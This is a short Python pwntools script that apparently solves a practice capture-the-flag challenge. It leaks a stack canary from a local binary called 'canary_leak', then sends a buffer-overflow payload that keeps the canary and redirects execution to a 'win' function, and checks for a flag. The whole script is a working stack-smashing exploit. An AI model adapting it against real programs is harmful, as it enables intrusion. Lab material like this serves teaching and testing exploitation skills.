#!/usr/bin/env python3
from pathlib import Path

from pwn import ELF, context, p64, process, u64

HERE = Path(__file__).resolve().parent
BINARY = HERE / "canary_leak"
EXPECTED = b"KSJ{CANARY_LEAK_BYPASS_VERIFIED}"

context.binary = elf = ELF(str(BINARY), checksec=False)
context.log_level = "error"
tube = process([str(BINARY)], cwd=str(HERE))

marker = b"A" * 0x108 + b"B"
tube.sendafter(b"stage1: overwrite only the canary NUL byte\n", marker)
tube.recvuntil(b"echo:\n")
tube.recvuntil(marker)
canary = u64(b"\x00" + tube.recvn(7))

ret = elf.sym["ret_only"]
payload = b"A" * 0x108
payload += p64(canary)
payload += b"B" * 8
payload += p64(ret)
payload += p64(elf.sym["win"])
tube.sendafter(b"stage2: preserve the leaked canary\n", payload)
output = tube.recvall(timeout=2)
assert EXPECTED in output, output
print(f"[PASS] canary_leak: canary={canary:#x}, win={elf.sym['win']:#x}")
